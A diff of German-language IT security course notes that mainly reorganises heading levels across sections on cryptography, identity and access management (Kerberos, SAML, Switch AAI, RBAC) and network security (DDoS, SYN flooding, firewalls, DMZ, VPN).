 
 ![](links/2020-10-07_10-42-14.png)
 
@@ -1536,7 +1721,7 @@ Wichtig:
     - Gilt K G = KV , dann heisst der Authentizierwert MAC (Message Authentication Code); z.B. Berechnung nach ANSI X9.9 (cf Kap. 8.2.1) resp. gemäss HMAC Konstruktion nach RFC 2104 (cf. Kap. 8.2.3).
     - Gilt K G /= KV , dann heisst der Authentizierwert Digitale Signatur; z.B. mit RSA, DSS resp. DSA, Schnorr u.a.; K G ist der Secret oder Private des Senders, und K V ist der Public Key des Senders
 
-##### Verfahren
+#### Verfahren
 
 - Symmetrische Verfahren sind: AES, 3DES, div. Stromchiffren usw.
     - Algorithmen die zum Chiffrieren und Dechiffrieren die gleichen Schlüssel benötigen, nennt man symmetrische Algorithmen (z.B. DES, SAFER, AES, IDEA u.a).
@@ -1557,7 +1742,7 @@ Wichtig:
     - Das Einschleusen von erfundenen Nachrichten wird entdeckt, d.h. Insertion wird verhindert.
     - Das Abstreiten eine Meldung unterschrieben zu haben (Non repudiation of origin)
 
-#####Asymmetrische Verschlüsselung
+#### Asymmetrische Verschlüsselung
 
 Schlüsselgenerierung
 
@@ -1577,7 +1762,7 @@ d: privater Schlüssel, geheim
 
 p,q: nach Gebrauch vernichten
 
-#####Vergleich Symmetrisch Asymmetrisch
+#### Vergleich Symmetrisch Asymmetrisch
 
 |Asymmetrisch|Symmetrisch|
 |---|---|
@@ -1588,7 +1773,7 @@ p,q: nach Gebrauch vernichten
 |Sicherheitsproblem: Von wem stammt ein öffentlicher Schlüssel?|Sicherheitsproblem: Schlüsseltransport|
 
 
-##### Codierungen
+#### Codierungen
 
 - Beispiele für die Entopie von 128Bit 
 
@@ -1617,7 +1802,7 @@ p,q: nach Gebrauch vernichten
     - Base64 A-Z, a-z, 0-9, /, + = 6 bits/symbol
     
     
-##### Hashfunktionen
+#### Hashfunktionen
 
 >Unter einer Hashfunktion verstehen wir eine Funktion, die die Elemente von einer „grossen“ Menge in eine „kleine“ abbildet. Wir können uns diese Funktion als Trichter vorstellen.
 
@@ -1633,7 +1818,7 @@ Prinzip:
     - Ein MD 5 darf beim Signieren nicht mehr verwendet werden. Heute ist SHA-2 oder Keccak – im Folgenden immer SHA-3 genannt – erforderlich!
     - Die verwendeten Hashfunktionen haben eine wichtige Eigenschaft, die zentral beim Einsatz im Signieren ist.
 
-##### Hybride Verschlüsserlung
+#### Hybride Verschlüsserlung
 
 - Eine Hashfunktion oder Streuwertfunktion ist eine Abbildung, die zu jeder
 
@@ -1651,7 +1836,7 @@ Prinzip:
     - „Einfaches“ Key Management (cf. asymmetrisches Verfahren).
     - Die bessere Performance der symmetrischen Verfahren wird mit der besseren Schlüsselverteilung der asymmetrischen Verfahren kombiniert.
 
-##### Symmetrische Verfahren
+#### Symmetrische Verfahren
 
 ##### Blockchiffren
 
@@ -1686,7 +1871,7 @@ Prinzip:
         c) Verfahren, die nur Schüssel austauschen können
             i. Diffie-Hellman
             
-##### Blockchiffren im Blockmodus
+#### Blockchiffren im Blockmodus
 
 ##### ECB-Modus (Electronic Codebook) für mehrere Blöcke
 
@@ -1724,11 +1909,11 @@ b. Würde eine Meldung mit Key K verschlüsselt verschickt und später die selbe
     - Eine Teilverschlüsselung und -entschlüsselung eines grossen Files oder Harddisk ist nicht möglich, d.h. es muss immer die ganze HD entschlüsselt resp. verschlüsselt werden.
     - In dieser Form können Meldungen, deren Länge nicht ein Vielfaches der Blocklänge sind nicht verschlüsselt werden. Möchte man das dann muss entweder ein Padding oder mit Hilfe eines „Tricks“ gearbeitet werden.
 
-#### Präsenz
+### Präsenz
 
 Sicherheits-Methoden sollen Publik gemacht werden können. - Solange der verwendete Schlüssel nicht bekannt ist...
 
-#####Übersicht: Angiffe vs. Kryptographische Verfahren
+#### Übersicht: Angiffe vs. Kryptographische Verfahren
 
 |Angriff|Verfahren|
 |---|---|
@@ -1762,20 +1947,20 @@ TSP - traveling Salesman Problem
     
 [Shore-Algorithmnus](https://de.wikipedia.org/wiki/Shor-Algorithmus)
 
-#### Nachbearbeitung
+### Nachbearbeitung
 
 
 ---
 ## 4 Identity- und Accessmanagement
 
-#### Lernziele
+### Lernziele
 
 - Ich kenne typische Bedrohungen und Massnahmen in den Bereichen Identity Management, Authentisierung, Autorisierung.
 - Ich weiss um die Stärken und Schwächen von Identity und Access Management Systemen und kann die Problematik von SSO (Single Sign On) richtig einschätzen.
 - Ich verstehe, wie das Identity Federation System der Schweizerischen Hochschulen (Switch AAI) funktioniert. 
 - Ich kann das Thema Identity und Access Management im Zusammenhang mit einer Webanwendung bearbeiten und Lösungen vorschlagen.
 
-#### Vorbereitung
+### Vorbereitung
 
 - RADIUS-Protokoll
 - Kerberos-Protokoll
@@ -1840,7 +2025,7 @@ TSP - traveling Salesman Problem
 
 - Datensniffinng: USB-Snoop
 
-#### Präsenz
+### Präsenz
 
 >Identität: „ ... völlige Übereinstimmung einer Person oder Sache mit dem, was sie ist oder als was sie bezeichnet wird.” 
 
@@ -1857,14 +2042,14 @@ TSP - traveling Salesman Problem
     - SIP
     - usw.
     
-ISO/IEC: Identity Management (IdM) umfasst
+#### ISO/IEC: Identity Management (IdM) umfasst
 
 - Die sichere Verwaltung von Identitäten n den Identifikationsprozess einer Einheit (inkl. optionaler Authentisierung) n Eine „Einheit“ kann alles sein, was eindeutig als solche erkannt werden kann (Person, Tier, Gerät, Objekt, Gruppe, Organisation, etc.)
 - Einheiten können mehrere Identitäten haben, die in verschiedenen Kontexten verwendet werden können.
 - Die Information, die mit der Identifikation einer Einheit innerhalb eines bestimmten Kontexts verbunden ist.
 
 
-Identity Management - IdM
+##### Identity Management - IdM
 - Erstellung
 - Speicherung - Eventuell Cloud Lösungen
 - Synchronisation - Dauert teilweise bis zu 72h
@@ -1878,7 +2063,7 @@ Identity Management - IdM
 - Um Identitäten in verschiedenen Verzeichnissen zu synchronisieren und bereitzustellen wird häufig ein Metadirectory verwendet.
 
 
-###Access Management (Authentisierung, Authorisierung)
+#### Access Management (Authentisierung, Authorisierung)
 - Das Access Management regelt den Zugriff eines Subjekts auf ein Objekt es beinhaltet also die Authentisierung, aber auch die Autorisierung.
 - Dies bedeutet, dass der Zugriff auf die Ressourcen gesteuert werden muss. 
 - Typische Protokolle zur Authentisierung von Benutzern sind: Kerberos, HTTP Basic Auth, SAML.
@@ -1886,13 +2071,13 @@ Identity Management - IdM
 
 - Kerberos, usw.
 
-####Argumente für Identity & Access Management (IAM) 
+#### Argumente für Identity & Access Management (IAM) 
   
 ![](links/2021-01-09_00-15-51.png)
 
 - [IAM - wiki](https://de.wikipedia.org/wiki/Identitätsmanagement#Identit.C3.A4tsmanagement_von_Unternehmen)
 
-Kosteneinsparung
+##### Kosteneinsparung
 - Personalaufwand
 - Vereinheitlichte IAM Architektur
 - Mitnutzung für nicht IT Themen
@@ -1902,15 +2087,15 @@ Kosteneinsparung
 - Verbesserte SLA
 - Veresserte Produltivität der Mitarbeitenden (kleinere Wartezeiten bei wechsel)
 
-Wettbewerbsvorteile
+##### Wettbewerbsvorteile
 - Self-Service
 - Bessere Kunderfreundlichkeit
 
-Vereinfachtes Reporting
+##### Vereinfachtes Reporting
 - GeoTracking
 - Kontrolle Rechtevergabe
 
-IT Risikomanagement
+##### IT Risikomanagement
 - Starke Authentisierung
 - Zeitnahe Terminierung von Konten bzw. Rechten 
 - Konsistente Anwendung und Prüfung von Policies 
@@ -1918,19 +2103,21 @@ IT Risikomanagement
 - Vorbeugende Risikoerkennung (z.B. Betrug)
   
 
-IAM Kernprozesse
+#### IAM Kernprozesse
 
 ![](links/2021-01-09_00-35-39.png)  
 
-- Governance
-    - Definition einer Policy 
-    - Festlegung der Organisation, der Domänen, der Akteure und der Prozesse 
-    - Treffen von Enscheidungen in Bezug auf die Strategie
-- Risikomanagement
-    - Analysieren und Behandeln der Risiken im Zusammenhang mit IAM
-- Compliance
-    - Sicherstellen der Einhaltung der regulatorischen Rahmenbedingungen 
-    - Prüfen der Einhaltung (Auditing)
+#####  Governance
+- Definition einer Policy 
+- Festlegung der Organisation, der Domänen, der Akteure und der Prozesse 
+- Treffen von Enscheidungen in Bezug auf die Strategie
+ 
+##### Risikomanagement
+- Analysieren und Behandeln der Risiken im Zusammenhang mit IAM
+- 
+##### Compliance
+- Sicherstellen der Einhaltung der regulatorischen Rahmenbedingungen 
+- Prüfen der Einhaltung (Auditing)
 
 
 - Verwaltung von Identitäten - Wer / Wem / Welche
@@ -1962,7 +2149,7 @@ IAM Kernprozesse
 - Audit Trail
     - Erstellen einer Logdatei, welche die Nachvollziehbarkeit aller Handlungen sicherstellt
 
-Verwaltung der Identitäten
+##### Verwaltung der Identitäten
 
 - Die Verwaltung der Identität ist primär ein Problem der richtigen Prozesse (und deren Einhaltung) und weniger eine technische Herausforderung.
 - Folgende Punkte müssen geklärt sein:
@@ -1976,17 +2163,17 @@ Verwaltung der Identitäten
 
 ![](links/2021-01-09_00-46-30.png)  
 
-Komponenten im IAM
+##### Komponenten im IAM
 
 ![](links/2021-01-09_01-02-43.png)  
 
-Das Identity Management umfasst folgende Komponenten
+##### Das Identity Management umfasst folgende Komponenten
 
 - Datenquellen: diese enthalten Daten zu den Identitäten, z.B. ein Verzeichnis mit Telefonnummern oder Benutzernamen
 - Verzeichnisdienst mit den digitalen Identitäten. Der Verzeichnisdienst enthält die digitalen Identitäten und beantwortet Anfragen nach Identitäten und Attributen
 - Verwaltungsinterface zur Pflege der Identitäten n Audit Trail, eine Aufzeichnung sämtlicher Aktionen im Zusammenhang mit digitalen Identitäten
 
-Access Management umfasst folgende Komponenten:
+##### Access Management umfasst folgende Komponenten:
 
 - Subjekt, das sich mit einem Authentisierungsmittel authentisiert (z.B. eine Person, die sich mit Passwort ausweist).
 - Der Authentisierungsgateway nimmt die Authentisierung entgegen und prüft, ob diese korrekt ist.
@@ -1997,54 +2184,53 @@ Access Management umfasst folgende Komponenten:
 - Er kann sowohl verschiedene Authentisierungsmittel prüfen wie auch eine Autorisierung und eine Abrechnung machen.
 
 
-Identitätsmanagement (IdM) Konzepte
+#### Identitätsmanagement (IdM) Konzepte
 - [IdM - Wiki](https://de.wikipedia.org/wiki/Identitätsmanagement)
-- Isolierte Benutzer und Berechtigungsnachweise pro Anwendung
-    - Die Identitäten werden direkt in der Anwendung gespeichert und auch dort verwaltet.
-- Zentralisierte Benutzerverwaltung
-    - Single SignOn (SSO) Identitätsdomäne (z.B. Kerberos, .NetPassport)
-    - Gemeinsame Benutzeridentität / Zertifikate für all Services (PKI)
-    - Meta-Verzeichnisse (Synchronisation von Identitäten über verschiedene Domänen)
-- Federation 
-    - Ziel ist es, dass eine Organisation die Identitäten von Personen von anderen Organisationen akzeptieren und diesen vertrauen kann.
-    - Man möchte die Verwaltung von Identitäten vereinfachen und es dem Benutzer ermöglichen, mit einer Identität auf Ressourcen in anderen Bereichen zugreifen zu können.
-    - Dies ermöglicht organisationsübergreifende Prozesse und Informationsflüsse.
-    - Die Identity Federation geht einen Schritt weiter als eine zentralisierte Identitätsverwaltung wie z.B. im Active Directory, da Sicherheitsgrenzen überschritten werden.
-    - Föderales Model mit einer virtuellen Identitätsdomäne
-    - Trennung des „Identity Service Provider“ vom IT-Service Provider (z.B. SAML,Liberty Alliance, Shibboleth)
-    - Benutzerzentrierte Modelle
-    - z.B. OpenID, CardSpace, Passwort Stores (virtuelles SSO) n Verwendung eines „Personal Authentication Device“ (HW oder SW
-- Beispiel SwitchAAI FFHS (OpenSource)
-    - Shibboleth
-        - Switch verwendet Shibboleth als Basis für die Identity Federation, resp. für das SSO (Switch AAI, Authentication and Authorization Infrastructure)
-        - Shibboleth ist frei verfügbar und steht unter einer Apache Lizenz.
-        - Entwickelt wurde Shibboleth von MACE (Middleware Architecture Committee for Education)
-        - Shibboleth basiert auf SAML (Security Assertion Markup Language. n Mit Shibboleth können folgende Ziele erreicht werden:
-            - SSO (Single Sign on)
-            - Bereitstellen und Aufbereiten von Informationen aus Identity Management Systemen für Dritte.
-            - Verteilte Zugriffe, unabhängig von Ort und Ressource 
-            - Lokale und zentrale Identity Provider
+##### Isolierte Benutzer und Berechtigungsnachweise pro Anwendung
+- Die Identitäten werden direkt in der Anwendung gespeichert und auch dort verwaltet.
+##### Zentralisierte Benutzerverwaltung
+- Single SignOn (SSO) Identitätsdomäne (z.B. Kerberos, .NetPassport)
+- Gemeinsame Benutzeridentität / Zertifikate für all Services (PKI)
+- Meta-Verzeichnisse (Synchronisation von Identitäten über verschiedene Domänen)
+##### Federation 
+- Ziel ist es, dass eine Organisation die Identitäten von Personen von anderen Organisationen akzeptieren und diesen vertrauen kann.
+- Man möchte die Verwaltung von Identitäten vereinfachen und es dem Benutzer ermöglichen, mit einer Identität auf Ressourcen in anderen Bereichen zugreifen zu können.
+- Dies ermöglicht organisationsübergreifende Prozesse und Informationsflüsse.
+- Die Identity Federation geht einen Schritt weiter als eine zentralisierte Identitätsverwaltung wie z.B. im Active Directory, da Sicherheitsgrenzen überschritten werden.
+- Föderales Model mit einer virtuellen Identitätsdomäne
+- Trennung des „Identity Service Provider“ vom IT-Service Provider (z.B. SAML,Liberty Alliance, Shibboleth)
+- Benutzerzentrierte Modelle
+- z.B. OpenID, CardSpace, Passwort Stores (virtuelles SSO) n Verwendung eines „Personal Authentication Device“ (HW oder SW
+#####  Beispiel SwitchAAI FFHS (OpenSource)
+- Shibboleth
+    - Switch verwendet Shibboleth als Basis für die Identity Federation, resp. für das SSO (Switch AAI, Authentication and Authorization Infrastructure)
+    - Shibboleth ist frei verfügbar und steht unter einer Apache Lizenz.
+    - Entwickelt wurde Shibboleth von MACE (Middleware Architecture Committee for Education)
+    - Shibboleth basiert auf SAML (Security Assertion Markup Language. n Mit Shibboleth können folgende Ziele erreicht werden:
+        - SSO (Single Sign on)
+        - Bereitstellen und Aufbereiten von Informationen aus Identity Management Systemen für Dritte.
+        - Verteilte Zugriffe, unabhängig von Ort und Ressource 
+        - Lokale und zentrale Identity Provider
         
-        - Hauptkomponente:
-            - Identity Provider: Wird von der Organisation bereitgestellt, deren Benutzer Zugriff auf einen eingeschränkten Dienst möchten. Dieser befindet sich somit in der Heimateinrichtung.
-            - Service Provider: Der Dienst, auf den die Benutzer zugreifen möchten. Dieser befindet sich somit beim Anbieter des Dienstes.
-            - Lokalisierungsdienst: Zeigt an, woher ein Benutzer kommt.
-        
-        - Switch AAI beruht auf standardisierten Technologien:
-        
-            - Transportweg wird durch SSL geschützt 
-            - Die Authentisierung der Systeme geschieht auf der Basis von Zertifikaten. Es werden nur Zertifikate aus einer bestimmten Liste von anerkannten CAs akzeptiert.
-            - Die Assertions werden mit SAML realisiert
-        - Jede Organisation, die bei Switch AAI mitmacht, unterstellt sich gewissen organisatorischen Bedingungen.
+##### Hauptkomponente:
+- Identity Provider: Wird von der Organisation bereitgestellt, deren Benutzer Zugriff auf einen eingeschränkten Dienst möchten. Dieser befindet sich somit in der Heimateinrichtung.
+- Service Provider: Der Dienst, auf den die Benutzer zugreifen möchten. Dieser befindet sich somit beim Anbieter des Dienstes.
+- Lokalisierungsdienst: Zeigt an, woher ein Benutzer kommt.
 
-Identity Federation - Andere Technologien
+#####  Switch AAI beruht auf standardisierten Technologien:
+- Transportweg wird durch SSL geschützt 
+- Die Authentisierung der Systeme geschieht auf der Basis von Zertifikaten. Es werden nur Zertifikate aus einer bestimmten Liste von anerkannten CAs akzeptiert.
+- Die Assertions werden mit SAML realisiert
+- Jede Organisation, die bei Switch AAI mitmacht, unterstellt sich gewissen organisatorischen Bedingungen.
+
+#### Identity Federation - Andere Technologien
 
 - CardSpace: Von Microsoft entwickelt mit dem Ziel einer möglichst hohen Widerstandsfähigkeit gegen Angriffe. CardSpace baut auf dem Webservices Protocol Stack auf (WS-*)
 - OpenID: wird von vielen grossen Anbietern wie yahoo oder google verwendet. OpenID basiert auf einem offenen Standard und verzichtet auf eine zentrale Verwaltung der Identitäten.
 - Liberty Alliance / Kantara: Verwendet SAML und WS-Trust als Basis.
 
 
-Ablauf eines Zugriffes
+#### Ablauf eines Zugriffes
 
 ![](links/2021-01-10_12-23-44.png)  
 
@@ -2064,7 +2250,7 @@ Ablauf eines Zugriffes
 12. Dazu kontaktiert sie wiederum das Identity Management System
 
 
-**Authentisierung**
+##### Authentisierung
  - Erkennung ohne Vorwissen
  - Verifikation der Identität 
     - Wissen - Logische Merkmale
@@ -2080,7 +2266,7 @@ Ablauf eines Zugriffes
 - Starke Authentisierung benötigt midestens zwei dieser Merkmale
 - Werden zwei dieser Faktoren kombiniert, sprechen wir von einer Zwei-Faktor Authentisierung oder auch einer starken Authentisierung.
     
-**Passwortschutz**
+##### Passwortschutz
 - Direktes in-Erfahrung-Bringen
 - Selektives Durchprobieren
     - Vergleich mit Listen „häufiger“ Passworte („Wörterbuchattacken“) 
@@ -2098,7 +2284,7 @@ Ablauf eines Zugriffes
     - Session Hijacking
     - Backdoor Angriffe im Context des Benutzers
 
-**Passwortmanagement**
+##### Passwortmanagement
 - Probleme:
     - Vielzahl von Passwörtern benötigt -> „single-sign-on“ 
     - „Gute“ Passwörter sind schwer zu merken
@@ -2114,7 +2300,7 @@ Ablauf eines Zugriffes
     - Länge der Passwörter erzwingen
     - Gültigkeitsdauer beschränken
 
-**SmartCard**
+##### SmartCard
 
 - SmartCards enthalten X.509 Zertifikate von PKIs.
 - Durch die Kombination des Besitzes eines Zertifikats auf einer Smart Cards und einer PIN für das Entsperren des Schlüssel auf der Smart Cards gilt dies als sehr sicheres Authentisierungsmittel.
@@ -2122,7 +2308,7 @@ Ablauf eines Zugriffes
 - Als Träger gibt es die Kartenform oder einen Kryptostick mit USB Anschluss. n Der private Schlüssel verlässt die Karte nie, Schlüsseloperationen werden immer auf der Karte ausgeführt.
 
 
-**One Time Password**
+##### One Time Password
 
 - One Time Password Verfahren gibt es in verschiedener Ausprägung
     - Zeitgesteuert 
@@ -2133,7 +2319,7 @@ Ablauf eines Zugriffes
 - Eine klassische Strichliste auf Papier ist ebenfalls eine Umsetzung des OTP Verfahrens.
 
 
-**Biometrische Zutrittskontrollen**
+##### Biometrische Zutrittskontrollen
 
 - Biometrische Zutrittskontrollen basieren auf Merkmalen einer Person, welche einmalig sind und dadurch eine korrekte Identifizierung ermöglichen.
 - Beispiele sind:
@@ -2148,18 +2334,18 @@ Ablauf eines Zugriffes
 - Sie definiert den Schnittpunkt der False Acceptance und False Rejection Rate Kurven n False Acceptance bedeutet, dass eine unberechtigte Person zugelassen worden ist
 - False Rejection bedeutet, dass eine berechtigte Person abgewiesen wurde n Je höher die Empfindlichkeit des Sensors eingestellt wird, desto sicherer wird das System, zum Preis, dass sich die Abweisung von berechtigten Personen ebenfalls erhöht.
 
-**Cross Over Error Rate**
+##### Cross Over Error Rate
 
 ![](links/2021-01-10_14-45-09.png)  
 
 
-**Single SignOn**
+##### Single SignOn
 - Single Sign On ermöglicht es einem Benutzer sich nur ein einziges Mal authentisieren zu müssen und danach Zugriff auf alle Ressourcen zu erhalten, für die er die entsprechenden Rechte besitzt.
 - Im Firmenumfeld wird dazu oft Kerberos eingesetzt 
 - Für Webanwendungen wird häufig SAML (Security Assertion Markup Language) verwendet 
 - Der Einsatz von Zertifikaten einer PKI kann ebenfalls als SSO System genutzt werden, wenn alle Anwendungen die Authentisierung via Zertifikat unterstützen.
 
-**Kerberos**
+##### Kerberos
 
 - Befindet sich in Windows
 - Authentifizierungsserver (AS) - Wer ist das?
@@ -2191,7 +2377,7 @@ Ablauf eines Zugriffes
     - Profile: Das Profil definiert die genaue Zusammenstellung von Assertion, Protocol und Binding, um einen bestimmten Use Case zu erfüllen.
 
 
-**Zertifikate (PKI)**
+##### Zertifikate (PKI)
 - SmartCard usw.
 - PIN
 - Der Benutzer weist sich mit seiner Smart Card, resp. dem darauf gespeicherten X.509 Zertifikat aus.
@@ -2199,7 +2385,7 @@ Ablauf eines Zugriffes
 - Es werden keine Autorisierungsinformationen übermittelt. Das Problem der Rechtevergabe muss gesondert gelöst werden.
 
 
-**Risiken von SSO**
+##### Risiken von SSO
 - Identitätsdiebstahl
     - Zugriff auf alle möglichen Applikationen
 - Verfügbarkeit muss sehr hoch sein, ansonsten geht nichts mehr
@@ -2210,7 +2396,7 @@ Ablauf eines Zugriffes
     - Das SSO System ist ein sehr attraktives Ziel für jeden Angreifer n Die Sicherheit des SSO Systems muss sich nach dem höchsten Schutzbedarf aller daran angeschlossenen Anwendungen richten, sonst entsteht das Risiko des „schwächsten Glieds in einer Kette“.
 
 
-**Authorisierung**
+##### Authorisierung
 - Minimale Zugriffsrechte (Least Privilege)
 - Only Need to Know
 - Vieraugenprinzip für Kritische Aufgaben (Approval Workflow)
@@ -2230,8 +2416,8 @@ Ablauf eines Zugriffes
         - Passworte
         - ACL (Access Control List)
 
-**ACL - Access Control Listen**
-
+##### ACL - Access Control Listen
+```{xml}
       owner                     group other
     
     - rwx                       rwx   rwx   userid groupid dateiname
@@ -2244,16 +2430,16 @@ Ablauf eines Zugriffes
     p = pipe                    S = setuid, aber kein w (für owner und group)
                                 T = setuid, aber kein w (für owner und other)
                                 t = sticky bit (nur owner darf file löschen)
-    
+```    
 
-**MAC - Mandatory Access Control**
+##### MAC - Mandatory Access Control
 - Systembestimmte (regelbasierte) Zugriffskontrolle 
 - Systembestimmte Rechte können durch benutzerbestimmte weiter eingeschränkt werden(aber nicht aufgehoben) 
 - Rechte können nicht weitergegeben werden n Realisierung durch
     - Dienste des Betriebssystems
     - Betriebssystemerweiterungen, spezielle Versionen (z.B. trusted solaris, SMACK, SELinux, Pitbull LX, GRSecurity Patch)
 
-**RBAC - Role Based Access Control**
+##### RBAC - Role Based Access Control
 - Jeder Benutzer wird einer „Rolle“ (oder Gruppe) zugeordnet (Bsp.: Administrator, Gast, Backupadmin, FIBUMitarbeiter, ...)
 - Eine Rolle besteht aus einem od. mehreren Profilen (= Zusammenstellung von speziellen Rechten auf Objekte
 - Dieses Vorgehen bietet Vorteile bezüglich der klaren Trennung von Aufgabenbereichen und erleichtert das Need-to-know Prinzip, das Monitoring sowie generell die Verwaltung.
@@ -2268,7 +2454,7 @@ Ablauf eines Zugriffes
     - Need to know: Jeder Mitarbeiter soll genau so viel wissen, wie er für die Erfüllung seiner Arbeit benötigt.
     - 4-Augen Prinzip: Besonders heikle Aufgaben müssen durch zwei Rollen/Benutzer ausgeführt werden.
  
-**Autorisierung: 4-Augen Prinzip**
+##### Autorisierung: 4-Augen Prinzip
 
 - 4-Augen-Prinzip:
     - Systemkritische Operationen müssen durch zwei Rollen/Benutzer ausgeführt werden.
@@ -2277,7 +2463,7 @@ Ablauf eines Zugriffes
     - Workflow: Benutzer1 aktiviert einen Befehl, der von Benutzer2 zu einem späteren Zeitpunkt ausgeführt werden kann.
     - Organisatorisch: Beide Benutzer „kontrollieren“ sich physisch gegenseitig bei der Arbeit.
 
-**Risiken von IAM**
+#### Risiken von IAM
 - Spoofing
 - Sicherheitslücken im IAM
 - Keine Erkennunng da Log nicht ausgewertet werden
@@ -2285,15 +2471,16 @@ Ablauf eines Zugriffes
 - Feglerhafte Prozesse
     - Nicht löschen oder Sperrung
    
-**Risiken im Zusammenhang mit IAM**
+#### Risiken im Zusammenhang mit IAM
 
-- Identitätsdiebstahl / Zugriffe von Angreifern n Spoofing (Vortäuschen einer Identität oder einer Authentisierung).
+- Identitätsdiebstahl / Zugriffe von Angreifern 
+-  Spoofing (Vortäuschen einer Identität oder einer Authentisierung).
 - Fehlerhafte Prozesse, die dazu führen, dass Identitäten nicht gelöscht werden oder Authentisierungsmittel nicht gesperrt werden.
 - Lücken im IAM System führen zu einer weitreichenden Kompromittierung der Firma.
 - Angriffe werden nicht erkannt, weil Logfiles nicht ausgewertet werden.
 
 
-**Identitätsdiebstahl**
+##### Identitätsdiebstahl
 
 - Identitätsdiebstahl
     - Identitätsdiebstahl ist ein immer grösser werdendes Problem und umfasst die missbräuchliche Verwendung einer Identität 
@@ -2311,7 +2498,7 @@ Ablauf eines Zugriffes
     - Session Hijacking: Der Angreifer kann nach der Authentisierung eines Benutzers dessen Session übernehmen.
     - RAT (Remote Access Tools, Backdoors): Der Angreifer infiziert das Opfer mit Malware und steuert daraufhin sein Gerät.
 
-**IAM und OWASP**
+##### IAM und OWASP
 
 - In den OWASP Top 10 sind folgende Problempunkte, die sich direkt auf IAM beziehen lassen:
     - A2 (Broken Authentication and Session Management): Lücken in der Authentisierung oder dem Session Management erlauben es dem Angreifer eine Identität zu übernehmen.
@@ -2323,7 +2510,7 @@ Ablauf eines Zugriffes
 ---
 ## 5 Netzwerk- und Systemsicherheit
 
-#### Lernziele
+### Lernziele
 
 - Ich kenne die Bedrohungen, welche auf das Netzwerk und auf Systeme einwirken.
 - Ich weiss, wie ich das Netzwerk segmentieren und mit Firewalls schützen kann. 
@@ -2331,15 +2518,15 @@ Ablauf eines Zugriffes
 - Ich kann die Schwachstellen eines Systems oder eines Netzwerks analysieren und Verbesserungsvorschläge erarbeiten.
 - Ich weiss, wie ich ein System härten kann, welche Bedeutung ein Patchmanagementprozess hat und wie Logfiles ausgewertet werden. 
 
-#### Vorbereitung
+### Vorbereitung
 
 - Lehrbuch C. Eckert: Kapitel 14, Abschnitte 14.1 bis 14.3.6
     - Sie können dieses Vorbereitung alleine lesen oder in einer beliebigen Gruppe.
 
 
-#### Präsenz
+### Präsenz
 
-#####Netzwerke
+#### Netzwerke
 
 ![](links/2021-01-10_15-42-04.png)  
 
@@ -2536,7 +2723,7 @@ Ablauf eines Zugriffes
 - [CVSS](https://de.wikipedia.org/wiki/CVSS)
 
 
-Bedrohungen der Netzwerksicherheit
+#### Bedrohungen der Netzwerksicherheit
 
 - Durch die starke Vernetzung und das örtlich unabhängige Arbeiten sind die Risiken im Bereich Netzwerk enorm gestiegen:
     - Angriffe auf Netzwerkebene wie DDOS, Portscans, Angriffe auf Dienste, Man-in-themiddle Attacken, etc.
@@ -2548,7 +2735,7 @@ Bedrohungen der Netzwerksicherheit
     - Mit Malware und/oder Social Engineering ist es für einen Angreifer in der Regel kein Problem, ein internes Gerät unter seine Kontrolle zu bringen.
 
 
-DDOS Problematik
+##### DDOS Problematik
 
 - Ein DOS (Denial of Service) Angriff führt dazu, dass ein Dienst für legitime Anfragen nicht mehr zur Verfügung steht.
 - Ein DDOS (Distributed Denial of Service) Angriff ist ein DOS, der von verschiedenen Systemen aus gleichzeitig und koordiniert einen Dienst lahmlegt
@@ -2556,7 +2743,7 @@ DDOS Problematik
 - Meist werden für DDOS Angriffe Botnetze verwendet.
     
 
-Normaler TCP Handshake & SYN Flooding
+##### Normaler TCP Handshake & SYN Flooding
 
 - Eine TCP Verbindung besteht aus einem Drei-Wege Handshake. SYN Flooding missbraucht diese Technik, um einem System die Ressourcen zu entziehen.
 - Das Quellsystem möchte eine Verbindung aufbauen und schickt deshalb ein Paket mit einem SYN Flag an das Zielsystem.
@@ -2564,7 +2751,7 @@ Normaler TCP Handshake & SYN Flooding
 - Darauf schickt das Quellsystem eine Bestätigung (ACK) und die Verbindung steht.
 
 
-SYN Flooding
+##### SYN Flooding
 
 - Viele Angreifer (z.B. Zombies in einem Botnetz) senden gleichzeitig viele SYN Anfragen mit gefälschten Absenderadressen.
 - Das Opfer nimmt diese entgegen und reiht sie in die Connection Queue ein, wo sie Ressourcen belegen.
@@ -2573,7 +2760,7 @@ SYN Flooding
 - Gegen grossangelegte SYN Floods müssen auf Providerseite diese Pakete gefiltert werden.
 
 
-Botnetze
+##### Botnetze
 
 - Ein Bot Netz besteht aus einer Vielzahl von infizierten Computern, welche von einem Angreifer für verschiedenste Zwecke (Spam- und Malware Verteilung, DDOS Angriffe, ferngesteuert werden.
 - Die grössten, bekannten Botnetze enthalten mehrere Millionen infizierte Computer und können sowohl von der aufsummierten Rechenleistung wie auch von der Bandbreite her ganze Länder vom Internet trennen.
@@ -2584,7 +2771,7 @@ Botnetze
 - Es zeigt sich aber, dass mit einem Botnetz die Infrastrukturen eines Landes empfindlich getroffen Ansätze zum Zug, um einer Zerstörung des Botnetzes vorzubeugen.
 
 
-Sonstige Attacken im Netzwerk
+##### Sonstige Attacken im Netzwerk
 
 - Passives Sniffen 
 - Automatisierte Attacken (Bsp. Nessus) 
@@ -2594,7 +2781,7 @@ Sonstige Attacken im Netzwerk
 - ARP Spoofing
 
 
-Firewall
+#### Firewall
 
 - Menge von Netzwerkkomponenten - realisiert in Hardware und/oder Software - die zwei Netzwerke mit unterschiedlichem Sicherheitsbedarf verbindet.
 - Ziele:
@@ -2607,7 +2794,7 @@ Firewall
 - Im vorliegenden Fall schützt die Firewall das lokale Netzwerk vor dem Internet.
 
 
-DMZ - De-Militarized Zone
+##### DMZ - De-Militarized Zone
 
 - Bedarf, einzelne Rechner „von aussen“ zugreifbar zu machen
     - Webserver, Mailserver, etc.
@@ -2616,14 +2803,14 @@ DMZ - De-Militarized Zone
 ![](links/2021-01-10_16-02-13.png)  
 
 
-VPN - Virtual Private Network
+##### VPN - Virtual Private Network
 
 - Verbindung zweier Rechner, so dass ein anderes Netzwerk (typischerweise das Internet) als Transportweg benutzt wird.
 
 ![](links/2021-01-10_16-03-05.png)  
 
 
-Firewall - Typen
+##### Firewall - Typen
 
 - Im wesentlichen zwei Typen im Gebrauch
     - Paketfilter (Layer 3 und 4) 
@@ -2634,7 +2821,7 @@ Firewall - Typen
     - Kombination
 
 
-Paketfilter
+##### Paketfilter
 
 - Ein Paketfilter filtert Pakete aufgrund dieser Eigenschaften: 
 - Quell- und Zieladresse n Verwendetes Protokoll (Portnummer) 
@@ -2651,7 +2838,7 @@ Application Level Gateway
 ![](links/2021-01-10_16-05-33.png)  
 
 
-Firewall - Grenzen
+##### Firewall - Grenzen
 
 - Firewalls schützen NICHT:
